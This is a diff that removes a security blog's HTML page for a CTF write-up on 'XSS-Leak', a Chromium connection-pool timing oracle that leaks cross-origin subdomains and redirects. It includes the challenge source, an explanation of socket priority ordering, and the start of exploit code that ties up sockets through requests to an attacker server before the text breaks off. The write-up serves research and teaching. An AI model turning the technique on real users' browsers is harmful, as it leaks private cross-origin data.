@@ -1,1092 +1,412 @@
-<!DOCTYPE html>
-<html lang="en">
-  <head lang="it"><script src="/livereload.js?mindelay=10&amp;v=2&amp;port=1313&amp;path=livereload" data-no-instant defer></script>
-  <meta charset="utf-8"/>
-  <meta name="viewport" content="width=device-width, initial-scale=1"/>
-  
-  
-  <link rel="preconnect" href="https://blog.babelo.xyz/"/>
-  <link rel="dns-prefetch" href="https://blog.babelo.xyz/"/><meta name="description" content="In this post, I will introduce XSS-Leak (&ldquo;Cross-Site-Subdomain Leak&rdquo;), a technique for Chromium-based browsers that leaks cross-origin redirects, …"/><title>XSS-Leak: Leaking Cross-Origin Redirects | Salvatore Abello&#39;s Blog</title>
-
-  <meta property="og:title"       content="XSS-Leak: Leaking Cross-Origin Redirects"/>
-  <meta property="og:description" content="In this post, I will introduce XSS-Leak (&ldquo;Cross-Site-Subdomain Leak&rdquo;), a technique for Chromium-based browsers that leaks cross-origin redirects, …"/>
-  <meta property="og:type"        content="article"/>
-  <meta property="og:url"         content="https://blog.babelo.xyz//posts/cross-site-subdomain-leak/"/>
-  <meta property="og:site_name"   content="Salvatore Abello&#39;s Blog"/>
-  <meta property="og:image" content="https://blog.babelo.xyz//images/65adf8e914bdc50b5f5f2e8b91b68cb1.png"/>
-
-  <meta name="twitter:card"        content="summary"/>
-  <meta name="twitter:title"       content="XSS-Leak: Leaking Cross-Origin Redirects"/>
-  <meta name="twitter:description" content="In this post, I will introduce XSS-Leak (&ldquo;Cross-Site-Subdomain Leak&rdquo;), a technique for Chromium-based browsers that leaks cross-origin redirects, …"/>
-  <meta name="twitter:image" content="https://blog.babelo.xyz//images/65adf8e914bdc50b5f5f2e8b91b68cb1.png"/>
-    <meta property="article:published_time" content="2025-07-31T11:10:54&#43;02:00"/>
-    <meta property="article:modified_time"  content="2025-07-31T11:10:54&#43;02:00"/>
-    <meta property="article:author" content="Salvatore Abello"/>
-
-  <link rel="canonical" href="https://blog.babelo.xyz//posts/cross-site-subdomain-leak/"/>
-
-  
-  <style>
-     
-    :root {
-      --bgcolor: #000000;
-      --dimcolor: #333;
-      --fontcolor: #ddd;
-      --linkcolor: #ff00ff;
-      --visitedcolor: #ff00ff;
-      --precolor: #fff;
-      --prebgcolor: #383838;
-    }
-    
-    body {
-      color: var(--fontcolor);
-      background: var(--bgcolor);
-      margin: 0;
-      font-family: Iosevka, monospace;
-    }
-    
-    #root {
-      font-family: Iosevka, monospace;
-      max-width: 750px;
-      margin: 0 auto;
-      padding: 10px;
-    }
-    
-     
-    #brand {
-      display: flex;
-      flex-direction: column;
-      align-items: center;
-      text-align: center;
-    }
-    
-    #brand a {
-      color: var(--fontcolor);
-      text-decoration: none;
-    }
-    
-    #brand h1, #brand h2 {
-      margin: 0;
-    }
-    
-     
-    h1 {
-      font-size: 1.5rem;
-    }
-    
-    #brand h1 {
-      font-size: 30px;
-      line-height: 1.1;
-      min-height: 33px;
-    }
-    
-    #brand h2 {
-      font-size: 20px;
-      font-weight: normal;
-      line-height: 1.2;
-      min-height: 24px;
-    }
-    
-    #brand .icon {
-      width: 75px;
-      height: 75px;
-      object-fit: contain;
-      aspect-ratio: 1 / 1;
-    }
-    
-     
-    .icon-link {
-      display: block;
-      width: 75px;
-      height: 75px;
-      flex-shrink: 0;
-    }
-    
-     
-    a {
-      text-decoration: none;
-      color: var(--linkcolor);
-      word-wrap: break-word;
-      overflow-wrap: break-word;
-      white-space: normal;
-    }
-    
-    a:hover {
-      text-decoration: underline;
-    }
-    
-    a:visited {
-      color: var(--visitedcolor);
-    }
-    
-     
-    .full-clickable-heading,
-    .full-clickable-heading a {
-      color: var(--linkcolor) !important;
-    }
-
-     
-    img {
-      display: block;
-      max-width: 100%;
-      height: auto;
-    }
-    
-     
-    header nav {
-      margin: 15px 0;
-    }
-    
-    nav a {
-      font-weight: bold;
-      padding: 2px 4px;
-      border: none;
-    }
-    
-    nav a:hover, nav a:focus {
-      text-decoration: underline;
-      background-color: rgba(255, 255, 255, 0.1);
-    }
-    
-     
-    #content {
-      min-height: 50vh;
-    }
-    
-     
-    article {
-      padding: 5px 0;
-    }
-  </style>
-
-  
-  
-  
-  
-  
-  
-  
-    <link rel="preload" href="/css/reset.css" as="style" onload="this.onload=null;this.rel='stylesheet'">
-    <link rel="preload" href="/css/font.css" as="style" onload="this.onload=null;this.rel='stylesheet'">
-    <link rel="preload" href="/css/smigle.css" as="style" onload="this.onload=null;this.rel='stylesheet'">
-    <link rel="preload" href="/css/syntax.css" as="style" onload="this.onload=null;this.rel='stylesheet'">
-    <noscript>
-      <link rel="stylesheet" href="/css/reset.css"/>
-      <link rel="stylesheet" href="/css/font.css"/>
-      <link rel="stylesheet" href="/css/smigle.css"/>
-      <link rel="stylesheet" href="/css/syntax.css"/>
-    </noscript>
-  
-
-  
-
-  
-  <link rel="preload" href="/fonts/iosevka-regular.woff2" as="font" type="font/woff2" crossorigin/>
-  
-  
-  <link rel="preload" href="/fonts/iosevka-bold.woff2" as="font" type="font/woff2" crossorigin/>
-  <link rel="preload" href="/fonts/iosevka-oblique.woff2" as="font" type="font/woff2" crossorigin/>
-
-  <link rel="apple-touch-icon" sizes="180x180" href="/apple-touch-icon.png">
-  <link rel="icon" type="image/png" sizes="32x32" href="/favicon-32x32.png">
-  <link rel="icon" type="image/png" sizes="16x16" href="/favicon-16x16.png">
-  <link rel="manifest" href="/site.webmanifest">
-  <link rel="mask-icon" href="/safari-pinned-tab.svg" color="#5bbad5">
-  <meta name="msapplication-TileColor" content="#da532c">
-  <meta name="theme-color"           content="#ffffff">
-
-  
-</head>
-
-  <body>
-    <div id="root">
-      <header>
-  <div id="brand">
-    <a class="icon-link" href="https://blog.babelo.xyz/" aria-label="Go to homepage">
-      <img class="icon" src="/images/65adf8e914bdc50b5f5f2e8b91b68cb1_hu_7b9be87489d5b961.webp" alt="Salvatore Abello&#39;s Blog logo" width="75" height="75" loading="eager" fetchpriority="high" />
-    </a>
-    <div class="text">
-      <a href="https://blog.babelo.xyz/"><h1>Salvatore Abello&#39;s Blog</h1></a>
-      <h2>Hacking &amp; other stuff</h2>
-    </div>
-  </div>
-  <nav>
-    
-      
-        
-        <a class="nav-link" href="/"><b>Home</b></a>
-      
-         | 
-        <a class="nav-link" href="/whoami/"><b>Whoami</b></a>
-      
-         | 
-        <a class="nav-link" href="/achievements/"><b>Achievements</b></a>
-      
-         | 
-        <a class="nav-link" href="/posts/"><b>Posts</b></a>
-      
-         | 
-        <a class="nav-link" href="/cves/"><b>CVEs</b></a>
-      
-    
-  </nav>
-  <hr>
-</header>
-
-      <div id="content">
-        
-  <main>
-    <article>
-      <h1 class="title">XSS-Leak: Leaking Cross-Origin Redirects</h1>
-      
-      <div class="post-meta">
-  <strong>
-    <span>Posted on</span>
-    <time>2025-07-31 11:10:54</time>
-    
-    
-  </strong>
-  <span> • 2068 words</span>
-  <span> • 10 minute read</span>
-  
-  
-</div>
-
-      <div class="content"><p>In this post, I will introduce <code>XSS-Leak</code> (&ldquo;Cross-Site-Subdomain Leak&rdquo;), a technique for Chromium-based browsers that leaks cross-origin redirects, <code>fetch()</code> destinations, and more. I use the name <code>XSS-Leak</code> because the original goal was to leak subdomains of cross-origin requests, as I&rsquo;ll explain later.</p>
-
-<h2 id="index">
-  <a class="full-clickable-heading" href="#index">
-    Index
-  </a>
-</h2>
-<ul>
-<li>
-
-  <a href="#index">Index</a>
-
-</li>
-<li>
-
-  <a href="#challenge-overview">Challenge Overview</a>
-
-
-<ul>
-<li>
-
-  <a href="#route-">Route /</a>
-
-</li>
-<li>
-
-  <a href="#content-security-policy">Content Security Policy</a>
-
-</li>
-<li>
-
-  <a href="#route-report">Route /report</a>
-
-</li>
-</ul>
-</li>
-<li>
-
-  <a href="#swimming-in-the-connection-pool-again">Swimming in the connection pool (again)</a>
-
-</li>
-<li>
-
-  <a href="#exploit---leaking-subdomains-of-cross-origin-requests">Exploit - Leaking subdomains of cross-origin requests</a>
-
-
-<ul>
-<li>
-
-  <a href="#poc">PoC</a>
-
-</li>
-</ul>
-</li>
-<li>
-
-  <a href="#leaking-redirect-hosts">Leaking redirect hosts</a>
-
-
-<ul>
-<li>
-
-  <a href="#poc---admin">PoC - Admin</a>
-
-</li>
-<li>
-
-  <a href="#poc---user">PoC - User</a>
-
-</li>
-</ul>
-</li>
-<li>
-
-  <a href="#use-cases">Use Cases</a>
-
-</li>
-<li>
-
-  <a href="#limitations">Limitations</a>
-
-</li>
-<li>
-
-  <a href="#conclusion">Conclusion</a>
-
-</li>
-</ul>
-<p>A few months ago I found a cool way to leak subdomains from cross-origin (no injection required), so I created a small challenge and posted it on X.</p>
-<p>Only two people managed to get the flag: 🩸 first blood to 
-
-  <a href="https://x.com/0xAl3ssandro" rel="noopener">0xAl3ssandro</a>
-
- and the second solve to 
-
-  <a href="https://x.com/J0R1AN/" rel="noopener">J0R1AN</a>
-
-, congrats!</p>
-
-<h2 id="challenge-overview">
-  <a class="full-clickable-heading" href="#challenge-overview">
-    Challenge Overview
-  </a>
-</h2>
-<p>We&rsquo;re given a minimal Express app which exposes two routes:</p>
-<ul>
-<li><code>/</code>, serves a page with an inline script</li>
-<li><code>/report</code>, triggers a visit from a headless Chrome bot</li>
-</ul>
-
-<h3 id="route-">
-  <a class="full-clickable-heading" href="#route-">
-    Route /
-  </a>
-</h3>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-html" data-lang="html"><span class="line"><span class="cl"><span class="cp">&lt;!DOCTYPE html&gt;</span>
-</span></span><span class="line"><span class="cl"><span class="p">&lt;</span><span class="nt">html</span> <span class="na">lang</span><span class="o">=</span><span class="s">&#34;en&#34;</span><span class="p">&gt;</span>
-</span></span><span class="line"><span class="cl"><span class="p">&lt;</span><span class="nt">head</span><span class="p">&gt;</span>
-</span></span><span class="line"><span class="cl">    <span class="p">&lt;</span><span class="nt">meta</span> <span class="na">charset</span><span class="o">=</span><span class="s">&#34;UTF-8&#34;</span><span class="p">&gt;</span>
-</span></span><span class="line"><span class="cl">    <span class="p">&lt;</span><span class="nt">meta</span> <span class="na">name</span><span class="o">=</span><span class="s">&#34;viewport&#34;</span> <span class="na">content</span><span class="o">=</span><span class="s">&#34;width=device-width, initial-scale=1.0&#34;</span><span class="p">&gt;</span>
-</span></span><span class="line"><span class="cl">    <span class="p">&lt;</span><span class="nt">title</span><span class="p">&gt;</span>challenge-01<span class="p">&lt;/</span><span class="nt">title</span><span class="p">&gt;</span>
-</span></span><span class="line"><span class="cl">    <span class="p">&lt;</span><span class="nt">p</span> <span class="na">id</span><span class="o">=</span><span class="s">&#34;result&#34;</span><span class="p">&gt;</span>Hello World!<span class="p">&lt;/</span><span class="nt">p</span><span class="p">&gt;</span>
-</span></span><span class="line"><span class="cl"><span class="p">&lt;/</span><span class="nt">head</span><span class="p">&gt;</span>
-</span></span><span class="line"><span class="cl"><span class="p">&lt;</span><span class="nt">body</span><span class="p">&gt;</span>
-</span></span><span class="line"><span class="cl">    <span class="p">&lt;</span><span class="nt">script</span> <span class="na">nonce</span><span class="o">=</span><span class="s">&#34;&lt;%= nonce %&gt;&#34;</span><span class="p">&gt;</span>
-</span></span><span class="line"><span class="cl">        <span class="kr">const</span> <span class="nx">DOMAIN</span> <span class="o">=</span> <span class="s2">&#34;&lt;%= DOMAIN %&gt;&#34;</span><span class="p">;</span>
-</span></span><span class="line"><span class="cl">        <span class="kr">const</span> <span class="nx">PORT</span> <span class="o">=</span> <span class="s2">&#34;&lt;%= PORT %&gt;&#34;</span><span class="p">;</span>
-</span></span><span class="line"><span class="cl">
-</span></span><span class="line"><span class="cl">        <span class="kr">const</span> <span class="nx">result</span> <span class="o">=</span> <span class="nb">document</span><span class="p">.</span><span class="nx">getElementById</span><span class="p">(</span><span class="s2">&#34;result&#34;</span><span class="p">);</span>
-</span></span><span class="line"><span class="cl">
-</span></span><span class="line"><span class="cl">        <span class="kr">const</span> <span class="nx">toHex</span> <span class="o">=</span> <span class="nx">s</span> <span class="p">=&gt;</span> <span class="p">[...</span><span class="k">new</span> <span class="nx">TextEncoder</span><span class="p">().</span><span class="nx">encode</span><span class="p">(</span><span class="nx">s</span><span class="p">)].</span><span class="nx">map</span><span class="p">(</span><span class="nx">b</span> <span class="p">=&gt;</span> <span class="nx">b</span><span class="p">.</span><span class="nx">toString</span><span class="p">(</span><span class="mi">16</span><span class="p">).</span><span class="nx">padStart</span><span class="p">(</span><span class="mi">2</span><span class="p">,</span><span class="s1">&#39;0&#39;</span><span class="p">)).</span><span class="nx">join</span><span class="p">(</span><span class="s1">&#39;&#39;</span><span class="p">);</span>
-</span></span><span class="line"><span class="cl">
-</span></span><span class="line"><span class="cl">        <span class="nb">window</span><span class="p">.</span><span class="nx">onhashchange</span> <span class="o">=</span> <span class="p">()</span> <span class="p">=&gt;</span> <span class="p">{</span>
-</span></span><span class="line"><span class="cl">            <span class="kd">let</span> <span class="nx">flag</span> <span class="o">=</span> <span class="nx">localStorage</span><span class="p">.</span><span class="nx">getItem</span><span class="p">(</span><span class="s2">&#34;flag&#34;</span><span class="p">)</span> <span class="o">||</span> <span class="s2">&#34;flag{fake_flag_for_testing}&#34;</span><span class="p">;</span>
-</span></span><span class="line"><span class="cl">            <span class="nx">fetch</span><span class="p">(</span><span class="sb">`http://</span><span class="si">${</span><span class="nx">toHex</span><span class="p">(</span><span class="nx">flag</span><span class="p">)</span><span class="si">}</span><span class="sb">.</span><span class="si">${</span><span class="nx">DOMAIN</span><span class="si">}</span><span class="sb">:</span><span class="si">${</span><span class="nx">PORT</span><span class="si">}</span><span class="sb">`</span><span class="p">)</span>
-</span></span><span class="line"><span class="cl">            <span class="p">.</span><span class="k">finally</span><span class="p">(()</span> <span class="p">=&gt;</span> <span class="nx">result</span><span class="p">.</span><span class="nx">innerText</span> <span class="o">=</span> <span class="s2">&#34;request sent&#34;</span><span class="p">)</span>
-</span></span><span class="line"><span class="cl">        <span class="p">}</span>
-</span></span><span class="line"><span class="cl">    <span class="p">&lt;/</span><span class="nt">script</span><span class="p">&gt;</span>
-</span></span><span class="line"><span class="cl"><span class="p">&lt;/</span><span class="nt">body</span><span class="p">&gt;</span>
-</span></span><span class="line"><span class="cl"><span class="p">&lt;/</span><span class="nt">html</span><span class="p">&gt;</span>
-</span></span></code></pre></div><p>When <code>location.hash</code> changes, the page:</p>
-<ul>
-<li>Reads <code>flag</code> from <code>localStorage</code> and hex-encodes it</li>
-<li>Sends a request to <code>http://&lt;hex(flag)&gt;.${DOMAIN}:${PORT}</code> (<code>DOMAIN = challenge-01.babelo.xyz</code> and <code>PORT = 80</code>)</li>
-<li>Prints <code>request sent</code></li>
-</ul>
-<style type="text/css">
-     
-    .notice {
-        --title-color: #fff;
-        --title-background-color: #6be;
-        --content-color: #444;
-        --content-background-color: #e7f2fa;
-    }
-
-    .notice.info {
-        --title-background-color: #fb7;
-        --content-background-color: #fec;
-    }
-
-    .notice.tip {
-        --title-background-color: #5a5;
-        --content-background-color: #efe;
-    }
-
-    .notice.warning {
-        --title-background-color: #c33;
-        --content-background-color: #fee;
-    }
-
-     
-    @media (prefers-color-scheme:dark) {
-        .notice {
-            --title-color: #fff;
-            --title-background-color: #069;
-            --content-color: #ddd;
-            --content-background-color: #023;
-        }
-
-        .notice.info {
-            --title-background-color: #a50;
-            --content-background-color: #420;
-        }
-
-        .notice.tip {
-            --title-background-color: #363;
-            --content-background-color: #121;
-        }
-
-        .notice.warning {
-            --title-background-color: #800;
-            --content-background-color: #400;
-        }
-    }
-
-    body.dark .notice {
-        --title-color: #fff;
-        --title-background-color: #069;
-        --content-color: #ddd;
-        --content-background-color: #023;
-    }
-
-    body.dark .notice.info {
-        --title-background-color: #a50;
-        --content-background-color: #420;
-    }
-
-    body.dark .notice.tip {
-        --title-background-color: #363;
-        --content-background-color: #121;
-    }
-
-    body.dark .notice.warning {
-        --title-background-color: #800;
-        --content-background-color: #400;
-    }
-
-     
-    .notice {
-        padding: 18px;
-        line-height: 24px;
-        margin-bottom: 24px;
-        border-radius: 4px;
-        color: var(--content-color);
-        background: var(--content-background-color);
-    }
-
-    .notice p:last-child {
-        margin-bottom: 0
-    }
-
-     
-    .notice-title {
-        margin: -18px -18px 12px;
-        padding: 4px 18px;
-        border-radius: 4px 4px 0 0;
-        font-weight: 700;
-        color: var(--title-color);
-        background: var(--title-background-color);
-    }
-
-     
-    .icon-notice {
-        display: inline-flex;
-        align-self: center;
-        margin-right: 8px;
-    }
-
-    .icon-notice img,
-    .icon-notice svg {
-        height: 1em;
-        width: 1em;
-        fill: currentColor;
-    }
-
-    .icon-notice img,
-    .icon-notice.baseline svg {
-        top: .125em;
-        position: relative;
-    }
-</style><div class="notice note" >
-    <p class="notice-title">
-        <span class="icon-notice baseline">
-            <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 128 300 300">
-  <path d="M150 128c82.813 0 150 67.188 150 150 0 82.813-67.188 150-150 150C67.187 428 0 360.812 0 278c0-82.813 67.188-150 150-150Zm25 243.555v-37.11c0-3.515-2.734-6.445-6.055-6.445h-37.5c-3.515 0-6.445 2.93-6.445 6.445v37.11c0 3.515 2.93 6.445 6.445 6.445h37.5c3.32 0 6.055-2.93 6.055-6.445Zm-.39-67.188 3.515-121.289c0-1.367-.586-2.734-1.953-3.516-1.172-.976-2.93-1.562-4.688-1.562h-42.968c-1.758 0-3.516.586-4.688 1.563-1.367.78-1.953 2.148-1.953 3.515l3.32 121.29c0 2.734 2.93 4.882 6.64 4.882h36.134c3.515 0 6.445-2.148 6.64-4.883Z"/>
-</svg>
-
-        </span>Note</p><p>Note: <code>window.onhashchange</code> wasn&rsquo;t required to solve the challenge, but it made the exploitation easier.</p></div>
-
-
-<h3 id="content-security-policy">
-  <a class="full-clickable-heading" href="#content-security-policy">
-    Content Security Policy
-  </a>
-</h3>
-<p>The server also sends a strict CSP</p>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-js" data-lang="js"><span class="line"><span class="cl"><span class="nx">app</span><span class="p">.</span><span class="nx">use</span><span class="p">((</span><span class="nx">req</span><span class="p">,</span> <span class="nx">res</span><span class="p">,</span> <span class="nx">next</span><span class="p">)</span> <span class="p">=&gt;</span> <span class="p">{</span>
-</span></span><span class="line"><span class="cl">    <span class="kr">const</span> <span class="nx">nonce</span> <span class="o">=</span> <span class="nx">crypto</span><span class="p">.</span><span class="nx">randomBytes</span><span class="p">(</span><span class="mi">16</span><span class="p">).</span><span class="nx">toString</span><span class="p">(</span><span class="s1">&#39;base64&#39;</span><span class="p">);</span>
-</span></span><span class="line"><span class="cl">    <span class="nx">res</span><span class="p">.</span><span class="nx">locals</span><span class="p">.</span><span class="nx">nonce</span> <span class="o">=</span> <span class="nx">nonce</span><span class="p">;</span>
-</span></span><span class="line"><span class="cl">
-</span></span><span class="line"><span class="cl">    <span class="nx">res</span><span class="p">.</span><span class="nx">setHeader</span><span class="p">(</span><span class="s2">&#34;Content-Security-Policy&#34;</span><span class="p">,</span> <span class="sb">`default-src &#39;none&#39;; script-src &#39;nonce-</span><span class="si">${</span><span class="nx">nonce</span><span class="si">}</span><span class="sb">&#39;; connect-src *.</span><span class="si">${</span><span class="nx">DOMAIN</span><span class="si">}</span><span class="sb">; base-uri &#39;none&#39;; frame-ancestors &#39;none&#39;`</span><span class="p">);</span>
-</span></span><span class="line"><span class="cl">    <span class="nx">next</span><span class="p">();</span>
-</span></span><span class="line"><span class="cl"><span class="p">});</span>
-</span></span></code></pre></div><p>So network requests are restricted to <code>*.${DOMAIN}:${PORT}</code> (<code>connect-src</code>) and framing is blocked both ways: the page can&rsquo;t create frames and it cannot be embedded by others (<code>frame-ancestors 'none'</code>)</p>
-
-<h3 id="route-report">
-  <a class="full-clickable-heading" href="#route-report">
-    Route /report
-  </a>
-</h3>
-<p>The bot simulates a user (or admin) using Chrome:</p>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-js" data-lang="js"><span class="line"><span class="cl"><span class="k">try</span><span class="p">{</span>
-</span></span><span class="line"><span class="cl">    <span class="p">...</span>
-</span></span><span class="line"><span class="cl">
-</span></span><span class="line"><span class="cl">    <span class="nx">page</span> <span class="o">=</span> <span class="kr">await</span> <span class="nx">context</span><span class="p">.</span><span class="nx">newPage</span><span class="p">();</span>
-</span></span><span class="line"><span class="cl">    
-</span></span><span class="line"><span class="cl">    <span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="sb">`The admin will visit </span><span class="si">${</span><span class="nx">SITE</span><span class="si">}</span><span class="sb"> first, and then </span><span class="si">${</span><span class="nx">url</span><span class="si">}</span><span class="sb">`</span><span class="p">);</span>
-</span></span><span class="line"><span class="cl">
-</span></span><span class="line"><span class="cl">    <span class="kr">await</span> <span class="nx">page</span><span class="p">.</span><span class="kr">goto</span><span class="p">(</span><span class="sb">`</span><span class="si">${</span><span class="nx">SITE</span><span class="si">}</span><span class="sb">`</span><span class="p">,</span> <span class="p">{</span> <span class="nx">waitUntil</span><span class="o">:</span> <span class="s2">&#34;domcontentloaded&#34;</span><span class="p">,</span> <span class="nx">timeout</span><span class="o">:</span> <span class="mi">5000</span> <span class="p">});</span>
-</span></span><span class="line"><span class="cl">    <span class="kr">await</span> <span class="nx">sleep</span><span class="p">(</span><span class="mi">100</span><span class="p">);</span>
-</span></span><span class="line"><span class="cl">
-</span></span><span class="line"><span class="cl">    <span class="kr">await</span> <span class="nx">page</span><span class="p">.</span><span class="nx">evaluate</span><span class="p">((</span><span class="nx">flag</span><span class="p">)</span> <span class="p">=&gt;</span> <span class="p">{</span>
-</span></span><span class="line"><span class="cl">        <span class="nx">localStorage</span><span class="p">.</span><span class="nx">setItem</span><span class="p">(</span><span class="s1">&#39;flag&#39;</span><span class="p">,</span> <span class="nx">flag</span><span class="p">);</span>
-</span></span><span class="line"><span class="cl">    <span class="p">},</span> <span class="nx">FLAG</span><span class="p">);</span>
-</span></span><span class="line"><span class="cl">
-</span></span><span class="line"><span class="cl">    <span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="sb">`localStorage.setItem(&#39;flag&#39;, &#39;</span><span class="si">${</span><span class="nx">FLAG</span><span class="si">}</span><span class="sb">&#39;)`</span><span class="p">)</span>
-</span></span><span class="line"><span class="cl">
-</span></span><span class="line"><span class="cl">    <span class="kr">await</span> <span class="nx">sleep</span><span class="p">(</span><span class="mi">500</span><span class="p">);</span>
-</span></span><span class="line"><span class="cl">
-</span></span><span class="line"><span class="cl"><span class="p">}</span> <span class="k">catch</span> <span class="p">(</span><span class="nx">err</span><span class="p">)</span> <span class="p">{</span>
-</span></span><span class="line"><span class="cl">    <span class="nx">console</span><span class="p">.</span><span class="nx">error</span><span class="p">(</span><span class="nx">err</span><span class="p">);</span>
-</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="p">(</span><span class="nx">browser</span><span class="p">)</span> <span class="kr">await</span> <span class="nx">browser</span><span class="p">.</span><span class="nx">close</span><span class="p">();</span>
-</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="nx">reject</span><span class="p">(</span><span class="k">new</span> <span class="nb">Error</span><span class="p">(</span><span class="s2">&#34;Error: Setup failed, if this happens consistently on remote contact the admin&#34;</span><span class="p">));</span>
-</span></span><span class="line"><span class="cl"><span class="p">}</span>
-</span></span><span class="line"><span class="cl">
-</span></span><span class="line"><span class="cl"><span class="nx">resolve</span><span class="p">(</span><span class="s2">&#34;The admin will visit your URL soon&#34;</span><span class="p">);</span>
-</span></span><span class="line"><span class="cl">
-</span></span><span class="line"><span class="cl"><span class="k">try</span> <span class="p">{</span>
-</span></span><span class="line"><span class="cl">    <span class="kr">await</span> <span class="nx">page</span><span class="p">.</span><span class="kr">goto</span><span class="p">(</span><span class="nx">url</span><span class="p">,</span> <span class="p">{</span> <span class="nx">waitUntil</span><span class="o">:</span> <span class="s2">&#34;domcontentloaded&#34;</span><span class="p">,</span> <span class="nx">timeout</span><span class="o">:</span> <span class="mi">5000</span> <span class="p">});</span>
-</span></span><span class="line"><span class="cl">    <span class="kr">await</span> <span class="nx">sleep</span><span class="p">(</span><span class="mi">120_000</span><span class="p">);</span>
-</span></span><span class="line"><span class="cl"><span class="p">}</span> <span class="k">catch</span> <span class="p">(</span><span class="nx">err</span><span class="p">)</span> <span class="p">{</span>
-</span></span><span class="line"><span class="cl">    <span class="nx">console</span><span class="p">.</span><span class="nx">error</span><span class="p">(</span><span class="nx">err</span><span class="p">);</span>
-</span></span><span class="line"><span class="cl"><span class="p">}</span>
-</span></span></code></pre></div><p>The bot, will:</p>
-<ul>
-<li>visits the challenge site</li>
-<li>stores the flag in the local storage</li>
-<li>Navigates to a supplied URL</li>
-<li>sleeps for 120 seconds</li>
-</ul>
-
-<h2 id="swimming-in-the-connection-pool-again">
-  <a class="full-clickable-heading" href="#swimming-in-the-connection-pool-again">
-    Swimming In The Connection Pool (again)
-  </a>
-</h2>
-<p>To solve this challenge, you need to know how Chrome&rsquo;s connection pool works ( background: 
-
-  <a href="https://xsleaks.dev/docs/attacks/timing-attacks/connection-pool/" rel="noopener">https://xsleaks.dev</a>
-
-). In short, Chrome can run up to 256 concurrent requests across different origins, but only 6 in parallel to the same origin.</p>
-<p>Chrome schedules by priority first: the request with the highest priority gets a socket (see the priority table 
-
-  <a href="https://web.dev/articles/fetch-priority?hl=en#resource-priority" rel="noopener">here</a>
-
-). But what if two requests have the same priority?</p>
-<p>You might expect FIFO, surprisingly, that&rsquo;s not what happens! When two requests have the same priority, Chrome will sort by port, then scheme, then host. So if two request have the same priority, port and scheme, Chrome will prioritize the one whose host is lexicographically lower (details in my earlier post 
-
-  <a href="https://blog.babelo.xyz/posts/css-exfiltration-under-default-src-self/#deep-diving-into-chromium-internals" rel="noopener">here</a>
-
-)</p>
-<p>Example: if request A targets <code>http://google.com:80</code> and request B targets <code>http://example.com:80</code>, <code>http://example.com:80</code> wins and gets the socket first (same port and scheme but <code>example.com</code> &lt; <code>google.com</code>).</p>
-<p>This quirk gives us an oracle. We can &ldquo;guess&rdquo; the unknown subdomain (the one the page fetches) with a binary search: by sending a request to a test host and seeing which request &ldquo;goes first&rdquo;, we can detect wheter our host comes before or after the challenge one alphabetically.</p>
-<blockquote>
-<p>I explained this behaviour in a 
-
-  <a href="https://blog.babelo.xyz/posts/css-exfiltration-under-default-src-self/#stalled-requests-priorities--more" rel="noopener">previous article</a>
-
- in a detailed way. Here I&rsquo;ll just cover what we need for the exploit</p>
-</blockquote>
-
-<h2 id="exploit---leaking-subdomains-of-cross-origin-requests">
-  <a class="full-clickable-heading" href="#exploit---leaking-subdomains-of-cross-origin-requests">
-    Exploit - Leaking subdomains of cross-origin requests
-  </a>
-</h2>
-<p>Firstly, let&rsquo;s create some functions to setup the connection pool</p>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-js" data-lang="js"><span class="line"><span class="cl"><span class="kr">const</span> <span class="nx">sleep</span> <span class="o">=</span> <span class="p">(</span><span class="nx">ms</span><span class="p">)</span> <span class="p">=&gt;</span> <span class="p">{</span>
-</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="k">new</span> <span class="nb">Promise</span><span class="p">(</span><span class="nx">resolve</span> <span class="p">=&gt;</span> <span class="p">{</span>
-</span></span><span class="line"><span class="cl">        <span class="nx">setTimeout</span><span class="p">(</span><span class="nx">resolve</span><span class="p">,</span> <span class="nx">ms</span><span class="p">);</span>
-</span></span><span class="line"><span class="cl">    <span class="p">});</span>
-</span></span><span class="line"><span class="cl"><span class="p">}</span>
-</span></span><span class="line"><span class="cl">
-</span></span><span class="line"><span class="cl"><span class="c1">// sends a fetch request that takes 360 seconds to finish
-</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="kr">const</span> <span class="nx">fetch_sleep_long</span> <span class="o">=</span> <span class="p">(</span><span class="nx">i</span><span class="p">)</span> <span class="p">=&gt;</span> <span class="p">{</span>
-</span></span><span class="line"><span class="cl">    <span class="nx">controller</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">AbortController</span><span class="p">();</span>
-</span></span><span class="line"><span class="cl">    <span class="kr">const</span> <span class="nx">signal</span> <span class="o">=</span> <span class="nx">controller</span><span class="p">.</span><span class="nx">signal</span><span class="p">;</span>
-</span></span><span class="line"><span class="cl">
-</span></span><span class="line"><span class="cl">    <span class="nx">fetch</span><span class="p">(</span><span class="sb">`http://sleep</span><span class="si">${</span><span class="nx">i</span><span class="si">}</span><span class="sb">.</span><span class="si">${</span><span class="nx">MYSERVER</span><span class="si">}</span><span class="sb">/360?q=</span><span class="si">${</span><span class="nx">i</span><span class="si">}</span><span class="sb">`</span><span class="p">,</span> <span class="p">{</span>
-</span></span><span class="line"><span class="cl">        <span class="nx">mode</span><span class="o">:</span> <span class="s1">&#39;no-cors&#39;</span><span class="p">,</span>
-</span></span><span class="line"><span class="cl">        <span class="nx">signal</span><span class="o">:</span> <span class="nx">signal</span>
-</span></span><span class="line"><span class="cl">    <span class="p">});</span>
-</span></span><span class="line"><span class="cl">
-</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="nx">controller</span>
-</span></span><span class="line"><span class="cl"><span class="p">}</span>
-</span></span><span class="line"><span class="cl">
-</span></span><span class="line"><span class="cl"><span class="c1">// blocks one socket
-</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="kr">const</span> <span class="nx">block_socket</span> <span class="o">=</span> <span class="kr">async</span> <span class="p">(</span><span class="nx">i</span><span class="p">)</span> <span class="p">=&gt;</span> <span class="p">{</span>
-</span></span><span class="line"><span class="cl">    <span class="kd">let</span> <span class="nx">controller</span> <span class="o">=</span> <span class="nx">fetch_sleep_long</span><span class="p">(</span><span class="nx">i</span><span class="p">);</span>
